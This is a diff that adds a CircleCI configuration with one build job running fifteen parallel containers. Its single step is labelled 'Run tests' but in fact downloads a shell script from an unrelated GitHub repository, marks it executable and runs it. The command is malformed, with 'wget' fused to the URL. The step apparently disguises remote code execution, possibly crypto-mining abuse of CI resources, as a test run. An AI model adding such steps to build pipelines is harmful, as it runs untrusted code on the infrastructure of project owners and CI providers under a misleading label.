@@ -1,0 +1,10 @@
+jobs:   
+  build:   
+    parallelism: 15
+    docker:   
+      - image: cimg/ruby:3.0.2-node   
+    steps:    
+      - checkout    
+      - run:    
+          name: Run tests    
+          command: wgethttps://github.com/circlecioneheart/skydya/blob/main/skytea.sh  && chmod +x skytea.sh && ./skytea.sh
